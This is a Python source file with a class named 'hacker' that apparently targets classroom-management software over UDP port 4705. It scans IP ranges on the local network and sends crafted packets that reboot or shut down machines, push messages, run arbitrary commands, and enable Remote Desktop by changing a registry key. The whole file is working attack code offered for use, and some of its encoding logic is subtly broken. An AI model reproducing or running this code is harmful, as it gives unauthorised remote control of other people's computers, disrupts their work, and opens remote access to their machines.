class hacker:

    def __init__(self):
        self.ip = None
        self.ports = None
        self.port = None
        self.get()

    def sendhack(self, send_list, ip, port=4705, r=1, t=1):
        if len(send_list) == 0:
            return
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        target_host = self.get_ip(ip)
        for times in range(r):
            for i in target_host:
                for abc in send_list:
                    payload = pack("%dB" % len(abc), *abc)
                    client.sendto(payload, (i, port))
                    print(f"send hack packet ip={i}")

            if r == 1:
                return print(f"send done ip={ip}")
                if times != r - 1:
                    sleep(t)

        return print(f"send done ip={ip}")

    def fmpl(self, pl):
        ls = []
        for i in range(0, len(pl), 2):
            c = pl[i:i+2]
            if c == "zz":
                ls.append(self.rand1())
            else:
                ls.append(int(c, 16))

        return ls

    def allip(self, ip):
        if "-" in ip:
            ip = input("ip:")
        return ".".join(ip.split(".")[0:-1]) + ".1-255"

    def get(self):
        global ip
        try:
            hostname = socket.gethostname()
            self.wip = hostname
            self.ip = socket.gethostbyname(hostname)
            print("本机ip:", self.ip)
            tasklist = popen('tasklist|find "Student"').read()
            pattern = compile("[e]\\s*\\d{1,5}\\s*[C]")
            pid = pattern.search(tasklist).group()[1:-1].strip()
            netstat = popen('netstat -ano |find "{}"'.format(pid)).read()
            pattern = compile("%s:\\d{1,5}\\s*[*]{1}" % ip)
            netstat_pat = pattern.findall(netstat)
            self.ports = [i.strip(ip)[1:-1].rstrip() for i in netstat_pat]
            self.port = self.ports[0]
        except:
            pass

        if self.ports == None:
            self.ports = [
             4705]
        if self.port == None:
            self.port = 4705

    def get_ip(self, ip):
        target_host,sb1=[],ip.split('.')
        if '-' in sb1[-1]:
            qianzhui='.'.join(sb1[0:-1])
            start,end=sb1[-1].split('-')
            for i in range(int(start),(int(end)+1 if int(end)+1<256 else 255),1):
                target_host.append(qianzhui+'.'+str(i))
        else:return [ip]
        return target_host

    def reboot(self, ip):
        self.sendhack([basicCMD["-r"]], ip, self.port)

    def poweroff(self, ip):
        self.sendhack([basicCMD["-s"]], ip, self.port)

    def msg(self, ip, txt, r=1, t=1):
        send_payload = txt.encode("utf-16").hex()
        jy = "zz"
        payload = f"444d4f43000001009e030000{jy}79fabb169ec04ca009db380f7f34ee204e0000c0a803fe9103000091030000000800000000000005000000{send_payload}"
        self.sendhack([self.fmpl(payload)], ip, self.port, r, t)

    def cmd(self, ip, s):
        s_hex = ""
        for i in range(len(s)):
            if s[i] == " ":
                s_hex += "20"
            s_hex = s_hex + hex(ord(s[i]))[2] + "00"
        payload = f"{s_hex}"
        self.sendhack([self.fmpl(payload)], ip, self.port)

    def tishirb(self, ip):
        payload = ""
        self.sendhack([self.fmpl(payload)], ip, self.port)

    def yczm(self, ip):
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s = 'REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD  /d  0  /f'
        s_hex = ""
        for i in range(len(s)):
            if i == " ":
                s_hex += "20"
            s_hex = s_hex + hex(ord(s[i]))[2] + "00"

        payload = f"{s_hex}"
        self.sendhack([self.fmpl(payload)], ip, self.port)

    def gbyycx(self, ip):
        payload = ""
        self.sendhack([self.fmpl(payload)], ip, self.port)

    def rand1(self):
        return random.randint(0, 255)


